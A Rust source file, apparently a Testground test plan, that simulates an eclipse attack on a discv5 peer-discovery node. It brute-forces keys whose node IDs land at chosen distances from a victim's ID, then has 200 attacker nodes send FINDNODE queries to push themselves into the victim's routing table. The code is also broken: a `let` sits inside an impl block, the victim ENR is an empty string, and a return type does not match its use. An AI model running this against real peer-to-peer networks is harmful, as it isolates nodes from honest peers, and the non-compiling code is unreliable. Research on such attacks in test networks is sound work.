use crate::publish_and_collect;
use discv5::enr::k256::elliptic_curve::rand_core::RngCore;
use discv5::enr::k256::elliptic_curve::rand_core::SeedableRng;
use discv5::enr::{CombinedKey, EnrBuilder, NodeId};
use discv5::{enr, Discv5, Discv5ConfigBuilder, Enr};
use discv5::Key;
use serde::{Deserialize, Serialize};
use std::net::SocketAddr;
use std::u64;
use std::time::Duration;
use std::thread::sleep;
use testground::client::Client;
use tokio::task;
use tracing::debug;
use surge_ping::IcmpPacket;

const STATE_COMPLETED_TO_COLLECT_INSTANCE_INFORMATION: &str =
    "STATE_COMPLETED_TO_COLLECT_INSTANCE_INFORMATION";
const STATE_ATTACKERS_SENT_QUERY: &str = "STATE_ATTACKERS_SENT_QUERY";
const STATE_DONE: &str = "STATE_DONE";

#[derive(Clone, Debug, Serialize, Deserialize)]
enum Role {
    Attacker,
}

impl From<&str> for Role {
    fn from(test_group_id: &str) -> Self {
        match test_group_id {
            "attackers" => Role::Attacker,
            _ => unreachable!(),
        }
    }
}

#[derive(Clone, Debug, Serialize, Deserialize)]
struct InstanceInfo {
    enr: Enr,
    role: Role,
}

pub(super) struct MonopolizingByIncomingNodes {}

impl MonopolizingByIncomingNodes {

    let victim_enr_base64 = "";

    pub(super) fn new() -> Self {
        MonopolizingByIncomingNodes {}
    }

    pub(super) async fn run(&self, client: Client) -> Result<(), Box<dyn std::error::Error>> {
        let run_parameters = client.run_parameters();
        // Note: The seq starts from 1.
        let role: Role = run_parameters.test_group_id.as_str().into();
        client.record_message(format!(
            "role: {:?}, group_seq: {}",
            role,
            client.group_seq()
        ));

        // ////////////////////////
        // Construct a local Enr
        // ////////////////////////
        // let enr_key = Self::generate_deterministic_keypair(client.group_seq(), &role);
        let victim_enr: Enr = Self::victim_enr_base64.parse().unwrap();
        client.record_message("Generating keys!!");
        let mut eclipse_keypairs: Vec<CombinedKey> = Self::generate_single_key_fill_buckets(&victim_enr, client.group_seq() % 13).await;
	client.record_message(format!("Generated keys lenght: {}", eclipse_keypairs.len()));
        let enr_key = eclipse_keypairs.remove(0);
        let enr = EnrBuilder::new("v4")
            .ip(run_parameters
                .data_network_ip()?
                .expect("IP address for the data network"))
            .udp4(9000)
            .build(&enr_key)
            .expect("Construct an Enr");
	client.record_message(format!("Generated ENR!!: {}", enr.to_base64()));
        // //////////////////////////////////////////////////////////////
        // Start Discovery v5 server
        // //////////////////////////////////////////////////////////////
        let discv5_config = Discv5ConfigBuilder::new()
            .incoming_bucket_limit(
                run_parameters
                    .test_instance_params
                    .get("incoming_bucket_limit")
                    .expect("incoming_bucket_limit")
                    .parse::<usize>()
                    .expect("Valid as usize"),
            )
            .build();
        let mut discv5 = Discv5::new(enr, enr_key, discv5_config)?;
        discv5
            .start("0.0.0.0:9000".parse::<SocketAddr>()?)
            .await
            .expect("Start Discovery v5 server");

        // Observe Discv5 events.
        let mut event_stream = discv5.event_stream().await.expect("Discv5Event");
        task::spawn(async move {
            while let Some(event) = event_stream.recv().await {
                debug!("Discv5Event: {:?}", event);
            }
        });

        // //////////////////////////////////////////////////////////////
        // Collect information of all participants in the test case
        // //////////////////////////////////////////////////////////////
        let instance_info = InstanceInfo {
            enr: discv5.local_enr(),
            role,
        };

        let attackers =
            self.collect_instance_info(&client, &instance_info).await?;

        client
            .signal_and_wait(
                STATE_COMPLETED_TO_COLLECT_INSTANCE_INFORMATION,
                run_parameters.test_instance_count,
            )
            .await?;

        // //////////////////////////////////////////////////////////////
        // Play the role
        // //////////////////////////////////////////////////////////////
        match instance_info.role {
            Role::Attacker => self.play_attacker(discv5, client).await?,
        }

        Ok(())
    }

    async fn generate_keys_fill_buckets(enr_victim: &Enr, quantity_per_bucket: u64, number_buckets: u64) -> Vec<CombinedKey> {
        // Generate `bucket_limit` keypairs that go in `enr` node's n-th bucket.
        let mut generated_keys = Vec::new();
        for n in 0..number_buckets {
            for _ in 0..quantity_per_bucket {
                loop {
                    let fake_new_key = CombinedKey::generate_secp256k1();
                    let fake_new_enr = EnrBuilder::new("v4").build(&fake_new_key).unwrap();
                    let victim_id: Key<NodeId> = enr_victim.node_id().into();
                    let fake_new_id: Key<NodeId> = fake_new_enr.node_id().into();
                    let distance = victim_id.log2_distance(&fake_new_id).unwrap();
                    if distance == (256 - n) {
                        generated_keys.push(fake_new_key);
                        break;
                    }
                }
            }
        }
        generated_keys
    }

    async fn generate_single_key_fill_buckets(enr_victim: &Enr, difficulty: u64) -> Vec<CombinedKey> {
        let mut generated_keys = Vec::new();
        loop {
            let fake_new_key = CombinedKey::generate_secp256k1();
            let fake_new_enr = EnrBuilder::new("v4").build(&fake_new_key).unwrap();
            let victim_id: Key<NodeId> = enr_victim.node_id().into();
            let fake_new_id: Key<NodeId> = fake_new_enr.node_id().into();
            let distance = victim_id.log2_distance(&fake_new_id).unwrap();
            if distance == (256 - difficulty) {
               generated_keys.push(fake_new_key);
               break;
            }
        }
        generated_keys
    }

    async fn collect_instance_info(
        &self,
        client: &Client,
        instance_info: &InstanceInfo,
    ) -> Result<(InstanceInfo, InstanceInfo, Vec<InstanceInfo>), Box<dyn std::error::Error>> {
        let mut attackers = vec![];

        for i in publish_and_collect(client, instance_info.clone()).await? {
            match i.role {
                Role::Attacker => attackers.push(i),
            }
        }

        assert!(attackers.len() == 200);

        Ok((attackers.remove(0), attackers.remove(0), attackers))
    }

    async fn play_attacker(
        &self,
        discv5: Discv5,
        client: Client,
    ) -> Result<(), Box<dyn std::error::Error>> {
        // The victim's ENR is added to the attacker's routing table prior to sending a query. So
        // the FINDNODE query will be sent to the victim, and then, if the victim is vulnerable
        // to the eclipse attack, the attacker's ENR will be added to the victim's routing table
        // because of the handshake.
        let victim_enr: Enr = Self::victim_enr_base64.parse().unwrap();
        let current_ip_address = client.run_parameters().data_network_ip()?.expect("IP address for the data network");
        client.record_message(format!("Current IP address: {:?}", current_ip_address));
        client.record_message("Attacking!!");
        // ping(&client).await;
        discv5.add_enr(victim_enr.clone())?;
        if let Err(e) = discv5.find_node(NodeId::random()).await {
            client.record_message(format!("Failed to run query: {}", e));
        }

        sleep(Duration::from_millis(10000));
        client.record_success().await?;
        Ok(())
    }
}

// This function is copied from https://github.com/sigp/discv5/blob/master/src/discv5/test.rs
// Generate `n` deterministic keypairs from a given seed.
fn generate_deterministic_keypair(n: usize, seed: u64) -> Vec<CombinedKey> {
    let mut keypairs = Vec::new();
    for i in 0..n {
        let sk = {
            let rng = &mut rand_xorshift::XorShiftRng::seed_from_u64(seed + i as u64);
            let mut b = [0; 32];
            loop {
                // until a value is given within the curve order
                rng.fill_bytes(&mut b);
                if let Ok(k) = enr::k256::ecdsa::SigningKey::from_bytes(&b) {
                    break k;
                }
            }
        };
        let kp = CombinedKey::from(sk);
        keypairs.push(kp);
    }
    keypairs
}

async fn ping(client: &Client) {
    let payload = [0; 8];
    match surge_ping::ping("142.132.254.123".parse().unwrap(), &payload).await {
        Ok((IcmpPacket::V4(packet), duration)) => {
            client.record_message(format!(
                "{} bytes from {}: icmp_seq={} ttl={:?} time={:.2?}",
                packet.get_size(),
                packet.get_source(),
                packet.get_sequence(),
                packet.get_ttl(),
                duration
            ));
        },
        _ => client.record_message(format!("Error in ping!")),
    };
}
